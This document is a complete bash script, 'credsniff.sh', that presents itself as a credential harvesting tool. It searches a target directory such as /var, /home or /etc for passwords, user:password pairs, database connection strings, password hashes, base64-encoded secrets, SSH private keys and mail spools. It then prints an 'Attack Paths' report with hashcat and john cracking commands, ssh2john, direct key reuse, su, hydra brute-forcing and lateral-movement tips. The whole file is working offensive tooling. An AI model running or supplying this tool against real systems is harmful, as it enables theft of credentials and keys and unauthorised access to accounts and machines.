#!/bin/bash
# ============================================================================
#   ██████╗██████╗ ███████╗██████╗ ███████╗███╗   ██╗██╗███████╗███████╗
#  ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║██║██╔════╝██╔════╝
#  ██║     ██████╔╝█████╗  ██║  ██║███████╗██╔██╗ ██║██║█████╗  █████╗
#  ██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝
#  ╚██████╗██║  ██║███████╗██████╔╝███████║██║ ╚████║██║██║     ██║
#   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝
# ============================================================================
#  Credential Sniffing & Harvest Tool
#  Targeted credential extraction with pattern matching, hash/b64 detection,
#  and structured attack path output.
#  Usage: ./credsniff.sh [-d /target/dir] [-p "user1|user2|password"] [-o outfile]
# ============================================================================

# ── Colors ──────────────────────────────────────────────────────────────────
R='\033[0;31m'    G='\033[0;32m'    Y='\033[0;33m'
B='\033[0;34m'    M='\033[0;35m'    C='\033[0;36m'
W='\033[1;37m'    DIM='\033[2m'     RST='\033[0m'
BG_R='\033[41m'   BG_G='\033[42m'   BG_Y='\033[43m'

# ── Defaults ────────────────────────────────────────────────────────────────
TARGET_DIR="/var"
PATTERN=""
OUTFILE=""
CONTEXT_LINES=2
VERBOSE=0
FOUND_COUNT=0
CRED_PAIRS=()
HASHES=()
B64_FINDS=()
KEY_FINDS=()
ATTACK_PATHS=()

# ── Banner ──────────────────────────────────────────────────────────────────
banner() {
    echo -e "${C}"
    echo "  ██████╗██████╗ ███████╗██████╗ ███████╗███╗   ██╗██╗███████╗███████╗"
    echo "  ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║██║██╔════╝██╔════╝"
    echo "  ██║     ██████╔╝█████╗  ██║  ██║███████╗██╔██╗ ██║██║█████╗  █████╗  "
    echo "  ██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  "
    echo "  ╚██████╗██║  ██║███████╗██████╔╝███████║██║ ╚████║██║██║     ██║     "
    echo "   ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝  "
    echo -e "${RST}"
    echo -e "${Y}  Credential Harvester — Targeted Extraction & Analysis${RST}"
    echo -e "${DIM}  ────────────────────────────────────────────────────────────────${RST}"
    echo ""
}

# ── Usage ───────────────────────────────────────────────────────────────────
usage() {
    echo -e "${W}Usage:${RST}"
    echo "  ./credsniff.sh -p \"charles|sam|password\" [-d /var] [-o report.txt] [-v]"
    echo ""
    echo -e "${W}Options:${RST}"
    echo "  -d DIR       Target directory to scrape (default: /var)"
    echo "  -p PATTERN   Grep-E pattern to match (e.g. \"user1|user2|password\")"
    echo "  -o FILE      Write report to file"
    echo "  -c NUM       Context lines around matches (default: 2)"
    echo "  -v           Verbose — show all raw matches before analysis"
    echo "  -h           Show this help"
    echo ""
    echo -e "${W}Examples:${RST}"
    echo "  ./credsniff.sh -p \"admin|root|password\""
    echo "  ./credsniff.sh -d /home -p \"charles|sam\" -o loot.txt"
    echo "  ./credsniff.sh -d /etc -p \"db_pass|mysql\" -c 5"
    exit 0
}

# ── Argument parsing ───────────────────────────────────────────────────────
while getopts "d:p:o:c:vh" opt; do
    case $opt in
        d) TARGET_DIR="$OPTARG" ;;
        p) PATTERN="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        c) CONTEXT_LINES="$OPTARG" ;;
        v) VERBOSE=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "$PATTERN" ]]; then
    echo -e "${R}[!] Error: -p PATTERN is required${RST}"
    usage
fi

if [[ ! -d "$TARGET_DIR" ]]; then
    echo -e "${R}[!] Error: $TARGET_DIR is not a directory or does not exist${RST}"
    exit 1
fi

# ── Output helper ──────────────────────────────────────────────────────────
out() {
    echo -e "$1"
    [[ -n "$OUTFILE" ]] && echo -e "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTFILE"
}

divider() {
    out "${DIM}  ──────────────────────────────────────────────────────────────${RST}"
}

# ── Hash identification ────────────────────────────────────────────────────
identify_hash() {
    local hash="$1"
    local len=${#hash}

    # bcrypt
    if [[ "$hash" =~ ^\$2[aby]?\$ ]]; then
        echo "bcrypt|hashcat -m 3200 / john --format=bcrypt"
        return
    fi
    # sha512crypt
    if [[ "$hash" =~ ^\$6\$ ]]; then
        echo "sha512crypt (shadow)|hashcat -m 1800 / john --format=sha512crypt"
        return
    fi
    # sha256crypt
    if [[ "$hash" =~ ^\$5\$ ]]; then
        echo "sha256crypt (shadow)|hashcat -m 7400 / john --format=sha256crypt"
        return
    fi
    # md5crypt
    if [[ "$hash" =~ ^\$1\$ ]]; then
        echo "md5crypt|hashcat -m 500 / john --format=md5crypt"
        return
    fi
    # Apache APR1
    if [[ "$hash" =~ ^\$apr1\$ ]]; then
        echo "Apache APR1 MD5|hashcat -m 1600 / john --format=md5crypt-long"
        return
    fi
    # NTLM
    if [[ $len -eq 32 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{32}$ ]]; then
        echo "MD5 or NTLM|hashcat -m 0 (MD5) or -m 1000 (NTLM)"
        return
    fi
    # SHA1
    if [[ $len -eq 40 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{40}$ ]]; then
        echo "SHA-1|hashcat -m 100 / john --format=raw-sha1"
        return
    fi
    # SHA256
    if [[ $len -eq 64 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{64}$ ]]; then
        echo "SHA-256|hashcat -m 1400 / john --format=raw-sha256"
        return
    fi
    # SHA512
    if [[ $len -eq 128 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{128}$ ]]; then
        echo "SHA-512|hashcat -m 1700 / john --format=raw-sha512"
        return
    fi
    # MySQL old
    if [[ $len -eq 16 ]] && [[ "$hash" =~ ^[a-fA-F0-9]{16}$ ]]; then
        echo "MySQL323|hashcat -m 200 / john --format=mysql"
        return
    fi
    # DES crypt
    if [[ $len -eq 13 ]] && [[ "$hash" =~ ^[a-zA-Z0-9./]{13}$ ]]; then
        echo "DES crypt|hashcat -m 1500 / john --format=descrypt"
        return
    fi

    echo "unknown|try: hash-identifier or hashid"
}

# ── Base64 detection ───────────────────────────────────────────────────────
check_base64() {
    local str="$1"
    # Must be at least 8 chars, valid b64 charset, proper padding
    if [[ ${#str} -ge 8 ]] && [[ "$str" =~ ^[A-Za-z0-9+/]{4,}={0,2}$ ]]; then
        local decoded
        decoded=$(echo "$str" | base64 -d 2>/dev/null)
        if [[ $? -eq 0 ]] && [[ -n "$decoded" ]]; then
            # Only flag if decoded output is printable text
            if echo "$decoded" | grep -qP '^[\x20-\x7E\n\r\t]+$'; then
                echo "$decoded"
                return 0
            fi
        fi
    fi
    return 1
}

# ── SSH key detection ──────────────────────────────────────────────────────
check_ssh_key() {
    local line="$1"
    if [[ "$line" =~ "BEGIN".*"PRIVATE KEY" ]] || \
       [[ "$line" =~ "BEGIN RSA PRIVATE" ]] || \
       [[ "$line" =~ "BEGIN DSA PRIVATE" ]] || \
       [[ "$line" =~ "BEGIN EC PRIVATE" ]] || \
       [[ "$line" =~ "BEGIN OPENSSH PRIVATE" ]]; then
        return 0
    fi
    return 1
}

# ── Credential pair extraction ─────────────────────────────────────────────
# Looks for common patterns: user:pass, password=X, credentials, etc.
extract_cred_context() {
    local line="$1"
    local file="$2"

    # user:password or username:password patterns
    if [[ "$line" =~ ([a-zA-Z0-9._-]+)[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
        local u="${BASH_REMATCH[1]}"
        local p="${BASH_REMATCH[2]}"
        # Filter out common false positives
        if [[ ! "$u" =~ ^(http|https|ftp|ssh|tcp|udp|localhost|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)$ ]]; then
            if [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev|tmp|proc|sys|sbin) ]]; then
                CRED_PAIRS+=("${file}|${u}|${p}")
            fi
        fi
    fi

    # password = value / password: value / pass= patterns
    if [[ "$line" =~ [Pp](ass(word|wd)?)[[:space:]]*[=:][[:space:]]*[\"\']*([^\"\'[:space:]]+) ]]; then
        local pw="${BASH_REMATCH[3]}"
        if [[ ${#pw} -ge 2 ]]; then
            CRED_PAIRS+=("${file}|password_field|${pw}")
        fi
    fi

    # DB connection strings: mysql://user:pass@host
    if [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
        local svc="${BASH_REMATCH[1]}"
        local u="${BASH_REMATCH[2]}"
        local p="${BASH_REMATCH[3]}"
        CRED_PAIRS+=("${file}|${svc}://${u}|${p}")
    fi
}

# ── Main scan ──────────────────────────────────────────────────────────────
main() {
    banner

    [[ -n "$OUTFILE" ]] && : > "$OUTFILE"

    out "${W}  Target:${RST}  ${C}${TARGET_DIR}${RST}"
    out "${W}  Pattern:${RST} ${C}${PATTERN}${RST}"
    out "${W}  Context:${RST} ${C}± ${CONTEXT_LINES} lines${RST}"
    out ""
    divider

    # ── Phase 1: Pattern grep ──────────────────────────────────────────────
    out "${G}[phase 1]${RST} ${W}Pattern matching...${RST}"
    out ""

    local match_files
    match_files=$(grep -rlE "$PATTERN" "$TARGET_DIR" 2>/dev/null | grep -v "Binary file")

    if [[ -z "$match_files" ]]; then
        out "${R}  No matches found for pattern in ${TARGET_DIR}${RST}"
        out "${Y}  Tip: Try broader patterns, different directory, or check permissions${RST}"
        divider
    else
        local file_count
        file_count=$(echo "$match_files" | wc -l)
        out "${G}  Found matches in ${file_count} file(s):${RST}"
        out ""

        while IFS= read -r file; do
            out "  ${B}━━ ${file}${RST}"

            local matches
            matches=$(grep -nE "$PATTERN" "$file" 2>/dev/null)

            while IFS= read -r match_line; do
                [[ -z "$match_line" ]] && continue
                FOUND_COUNT=$((FOUND_COUNT + 1))

                local line_num="${match_line%%:*}"
                local content="${match_line#*:}"

                out "  ${DIM}L${line_num}:${RST} ${content}"

                # Show context if requested
                if [[ $CONTEXT_LINES -gt 0 ]]; then
                    grep -n -C "$CONTEXT_LINES" -E "$PATTERN" "$file" 2>/dev/null | \
                        awk -F: -v ln="$line_num" -v ctx="$CONTEXT_LINES" \
                        'NR>=ln-ctx && NR<=ln+ctx && $1!=ln {printf "  \033[2m     %s\033[0m\n", $0}'
                fi

                # Run extraction on matched line
                extract_cred_context "$content" "$file"

            done <<< "$matches"
            out ""
        done <<< "$match_files"
        divider
    fi

    # ── Phase 2: Hash detection ────────────────────────────────────────────
    out "${G}[phase 2]${RST} ${W}Scanning for hashes...${RST}"
    out ""

    # Shadow-style hashes
    local shadow_hashes
    shadow_hashes=$(grep -rnoE '\$[0-9a-z]+\$[^\s:]{8,}' "$TARGET_DIR" 2>/dev/null | grep -v "Binary file" | head -30)

    # Standalone hex hashes (at word boundaries, min 32 chars)
    local hex_hashes
    hex_hashes=$(grep -rnoEh '\b[a-fA-F0-9]{32,128}\b' "$TARGET_DIR" 2>/dev/null | grep -v "Binary file" | head -30)

    local hash_found=0

    if [[ -n "$shadow_hashes" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            local src="${line%%:*}"
            local rest="${line#*:}"
            local ln="${rest%%:*}"
            local hash="${rest#*:}"

            local id_result
            id_result=$(identify_hash "$hash")
            local hash_type="${id_result%%|*}"
            local crack_cmd="${id_result#*|}"

            out "  ${R}[HASH]${RST} ${W}${hash_type}${RST}"
            out "    ${DIM}Source:${RST} ${src}:${ln}"
            out "    ${DIM}Hash:${RST}   ${hash}"
            out "    ${DIM}Crack:${RST}  ${Y}${crack_cmd}${RST}"
            out ""

            HASHES+=("${hash_type}|${hash}|${crack_cmd}|${src}")
            ATTACK_PATHS+=("Crack ${hash_type} hash from ${src} → ${crack_cmd}")
            hash_found=1
        done <<< "$shadow_hashes"
    fi

    if [[ -n "$hex_hashes" ]] && [[ $hash_found -eq 0 ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            # Skip overly long hex (likely not a hash)
            [[ ${#line} -gt 130 ]] && continue

            local hash="$line"
            local id_result
            id_result=$(identify_hash "$hash")
            local hash_type="${id_result%%|*}"
            local crack_cmd="${id_result#*|}"

            if [[ "$hash_type" != "unknown" ]]; then
                out "  ${R}[HASH]${RST} ${W}${hash_type}${RST}"
                out "    ${DIM}Hash:${RST}  ${hash}"
                out "    ${DIM}Crack:${RST} ${Y}${crack_cmd}${RST}"
                out ""
                HASHES+=("${hash_type}|${hash}|${crack_cmd}|inline")
                hash_found=1
            fi
        done <<< "$hex_hashes"
    fi

    [[ $hash_found -eq 0 ]] && out "  ${DIM}No hashes detected${RST}"
    out ""
    divider

    # ── Phase 3: Base64 detection ──────────────────────────────────────────
    out "${G}[phase 3]${RST} ${W}Scanning for base64 strings...${RST}"
    out ""

    local b64_found=0
    local b64_strings
    b64_strings=$(grep -rnoEh '[A-Za-z0-9+/]{12,}={0,2}' "$TARGET_DIR" 2>/dev/null | \
                  grep -v "Binary file" | sort -u | head -50)

    if [[ -n "$b64_strings" ]]; then
        while IFS= read -r b64; do
            [[ -z "$b64" ]] && continue
            local decoded
            decoded=$(check_base64 "$b64")
            if [[ $? -eq 0 ]] && [[ -n "$decoded" ]]; then
                # Only show if decoded content looks interesting
                if echo "$decoded" | grep -qiE "pass|user|key|token|secret|admin|root|login|cred|auth|flag"; then
                    out "  ${M}[B64]${RST} ${W}Encoded:${RST} ${b64:0:60}..."
                    out "    ${DIM}Decoded:${RST} ${R}${decoded}${RST}"
                    out ""
                    B64_FINDS+=("${b64}|${decoded}")
                    ATTACK_PATHS+=("Decoded base64 contains credential material: ${decoded:0:60}")
                    b64_found=1
                fi
            fi
        done <<< "$b64_strings"
    fi

    [[ $b64_found -eq 0 ]] && out "  ${DIM}No interesting base64 strings detected${RST}"
    out ""
    divider

    # ── Phase 4: SSH keys ──────────────────────────────────────────────────
    out "${G}[phase 4]${RST} ${W}Scanning for SSH keys...${RST}"
    out ""

    local key_found=0
    local key_files
    key_files=$(grep -rl "PRIVATE KEY" "$TARGET_DIR" 2>/dev/null)

    if [[ -n "$key_files" ]]; then
        while IFS= read -r kf; do
            [[ -z "$kf" ]] && continue
            local key_type="Unknown"
            if grep -q "RSA" "$kf" 2>/dev/null; then key_type="RSA"
            elif grep -q "DSA" "$kf" 2>/dev/null; then key_type="DSA"
            elif grep -q "EC" "$kf" 2>/dev/null; then key_type="EC"
            elif grep -q "OPENSSH" "$kf" 2>/dev/null; then key_type="OpenSSH"
            fi

            local encrypted="No"
            if grep -q "ENCRYPTED" "$kf" 2>/dev/null; then
                encrypted="Yes"
            fi

            local perms
            perms=$(ls -la "$kf" 2>/dev/null | awk '{print $1}')

            out "  ${R}[KEY]${RST} ${W}${key_type} Private Key${RST}"
            out "    ${DIM}File:${RST}       ${kf}"
            out "    ${DIM}Encrypted:${RST}  ${encrypted}"
            out "    ${DIM}Perms:${RST}      ${perms}"

            if [[ "$encrypted" == "Yes" ]]; then
                out "    ${DIM}Crack:${RST}      ${Y}ssh2john ${kf} > key.hash && john key.hash --wordlist=rockyou.txt${RST}"
                ATTACK_PATHS+=("Crack encrypted ${key_type} key: ssh2john ${kf}")
            else
                out "    ${DIM}Use:${RST}        ${Y}chmod 600 ${kf} && ssh -i ${kf} user@target${RST}"
                ATTACK_PATHS+=("Use ${key_type} key directly: ssh -i ${kf} user@target")
            fi
            out ""

            KEY_FINDS+=("${kf}|${key_type}|${encrypted}")
            key_found=1
        done <<< "$key_files"
    fi

    [[ $key_found -eq 0 ]] && out "  ${DIM}No SSH private keys found${RST}"
    out ""
    divider

    # ── Phase 5: Interesting files (no extension — mail, configs) ──────────
    out "${G}[phase 5]${RST} ${W}Checking mail & extensionless files...${RST}"
    out ""

    local mail_found=0
    local mail_dirs=("${TARGET_DIR}/mail" "${TARGET_DIR}/spool/mail")

    for mdir in "${mail_dirs[@]}"; do
        if [[ -d "$mdir" ]]; then
            local mfiles
            mfiles=$(ls -1 "$mdir" 2>/dev/null)
            if [[ -n "$mfiles" ]]; then
                out "  ${B}[MAIL]${RST} ${W}${mdir}/${RST}"
                while IFS= read -r mf; do
                    [[ -z "$mf" ]] && continue
                    local full="${mdir}/${mf}"
                    [[ ! -r "$full" ]] && continue

                    local preview
                    preview=$(head -30 "$full" 2>/dev/null)

                    out "    ${C}${mf}${RST}"

                    # Check if mail matches our pattern
                    if echo "$preview" | grep -qiE "$PATTERN" 2>/dev/null; then
                        out "    ${R}  ↳ PATTERN MATCH inside this mail!${RST}"
                        local mail_match
                        mail_match=$(grep -niE "$PATTERN" "$full" 2>/dev/null | head -10)
                        while IFS= read -r ml; do
                            out "      ${ml}"
                            extract_cred_context "${ml#*:}" "$full"
                        done <<< "$mail_match"
                    fi

                    # Check for passwords/creds in mail regardless of pattern
                    if echo "$preview" | grep -qiE "password|passwd|pass:|credentials|secret" 2>/dev/null; then
                        out "    ${Y}  ↳ Credential keywords detected in mail${RST}"
                        grep -niE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null | head -5 | \
                            while IFS= read -r cl; do
                                out "      ${cl}"
                                extract_cred_context "${cl#*:}" "$full"
                            done
                        ATTACK_PATHS+=("Read full mail: cat ${full}")
                    fi

                    mail_found=1
                    out ""
                done <<< "$mfiles"
            fi
        fi
    done

    [[ $mail_found -eq 0 ]] && out "  ${DIM}No readable mail found${RST}"
    out ""
    divider

    # ══════════════════════════════════════════════════════════════════════════
    #  REPORT
    # ══════════════════════════════════════════════════════════════════════════
    out ""
    out "${BG_R}${W}  FINDINGS REPORT  ${RST}"
    out ""

    # ── Credential pairs ───────────────────────────────────────────────────
    if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
        out "  ${R}┌─ Potential Credentials ─────────────────────────────────────┐${RST}"

        # Deduplicate
        local -A seen_creds
        for entry in "${CRED_PAIRS[@]}"; do
            local src="${entry%%|*}"
            local rest="${entry#*|}"
            local user="${rest%%|*}"
            local pass="${rest#*|}"
            local key="${user}::${pass}"

            if [[ -z "${seen_creds[$key]+x}" ]]; then
                seen_creds[$key]=1
                out "  ${R}│${RST} ${W}User:${RST} ${C}${user}${RST}"
                out "  ${R}│${RST} ${W}Pass:${RST} ${R}${pass}${RST}"
                out "  ${R}│${RST} ${DIM}From: ${src}${RST}"
                out "  ${R}│${RST}"
            fi
        done

        out "  ${R}└─────────────────────────────────────────────────────────────┘${RST}"
        out ""
    fi

    # ── Hashes ─────────────────────────────────────────────────────────────
    if [[ ${#HASHES[@]} -gt 0 ]]; then
        out "  ${Y}┌─ Hashes Found ──────────────────────────────────────────────┐${RST}"

        for entry in "${HASHES[@]}"; do
            IFS='|' read -r htype hash crack src <<< "$entry"
            out "  ${Y}│${RST} ${W}Type:${RST}  ${htype}"
            out "  ${Y}│${RST} ${W}Hash:${RST}  ${hash:0:72}"
            out "  ${Y}│${RST} ${W}Crack:${RST} ${Y}${crack}${RST}"
            out "  ${Y}│${RST} ${DIM}From: ${src}${RST}"
            out "  ${Y}│${RST}"
        done

        out "  ${Y}└─────────────────────────────────────────────────────────────┘${RST}"
        out ""
    fi

    # ── Base64 ─────────────────────────────────────────────────────────────
    if [[ ${#B64_FINDS[@]} -gt 0 ]]; then
        out "  ${M}┌─ Base64 Decoded Secrets ────────────────────────────────────┐${RST}"

        for entry in "${B64_FINDS[@]}"; do
            local enc="${entry%%|*}"
            local dec="${entry#*|}"
            out "  ${M}│${RST} ${W}Encoded:${RST} ${enc:0:50}..."
            out "  ${M}│${RST} ${W}Decoded:${RST} ${R}${dec}${RST}"
            out "  ${M}│${RST}"
        done

        out "  ${M}└─────────────────────────────────────────────────────────────┘${RST}"
        out ""
    fi

    # ── SSH Keys ───────────────────────────────────────────────────────────
    if [[ ${#KEY_FINDS[@]} -gt 0 ]]; then
        out "  ${B}┌─ SSH Keys ──────────────────────────────────────────────────┐${RST}"

        for entry in "${KEY_FINDS[@]}"; do
            IFS='|' read -r path ktype enc <<< "$entry"
            out "  ${B}│${RST} ${W}File:${RST}      ${path}"
            out "  ${B}│${RST} ${W}Type:${RST}      ${ktype}"
            out "  ${B}│${RST} ${W}Encrypted:${RST} ${enc}"
            out "  ${B}│${RST}"
        done

        out "  ${B}└─────────────────────────────────────────────────────────────┘${RST}"
        out ""
    fi

    # ── Attack path summary ────────────────────────────────────────────────
    if [[ ${#ATTACK_PATHS[@]} -gt 0 ]]; then
        out "  ${G}┌─ Attack Paths ──────────────────────────────────────────────┐${RST}"

        local i=1
        local -A seen_paths
        for path in "${ATTACK_PATHS[@]}"; do
            if [[ -z "${seen_paths[$path]+x}" ]]; then
                seen_paths[$path]=1
                out "  ${G}│${RST} ${W}${i}.${RST} ${path}"
                i=$((i + 1))
            fi
        done

        out "  ${G}│${RST}"
        out "  ${G}│${RST} ${DIM}Quick wins:${RST}"
        out "  ${G}│${RST}   ${Y}su - <user>${RST}          Try extracted passwords"
        out "  ${G}│${RST}   ${Y}ssh <user>@localhost${RST}  Lateral movement"
        out "  ${G}│${RST}   ${Y}hydra -L users -P passes ssh://target${RST}"
        out "  ${G}└─────────────────────────────────────────────────────────────┘${RST}"
        out ""
    fi

    # ── Nothing found ──────────────────────────────────────────────────────
    local total=$((${#CRED_PAIRS[@]} + ${#HASHES[@]} + ${#B64_FINDS[@]} + ${#KEY_FINDS[@]}))
    if [[ $total -eq 0 ]]; then
        out "  ${Y}No definitive credentials extracted.${RST}"
        out ""
        out "  ${W}Suggestions:${RST}"
        out "    1. Broaden pattern:  ${C}-p \"pass|cred|secret|key|token|auth\"${RST}"
        out "    2. Try other dirs:   ${C}-d /home${RST}  ${C}-d /etc${RST}  ${C}-d /opt${RST}  ${C}-d /tmp${RST}"
        out "    3. Check histories:  ${C}cat ~/.bash_history /home/*/.bash_history${RST}"
        out "    4. Check configs:    ${C}find / -name '*.conf' -readable 2>/dev/null${RST}"
        out "    5. Run privy.sh for full privesc enumeration"
        out ""
    fi

    out "${DIM}  Scan complete — ${FOUND_COUNT} raw pattern matches, ${total} actionable findings${RST}"
    [[ -n "$OUTFILE" ]] && out "  ${G}Report saved to: ${OUTFILE}${RST}"
    out ""
}

main
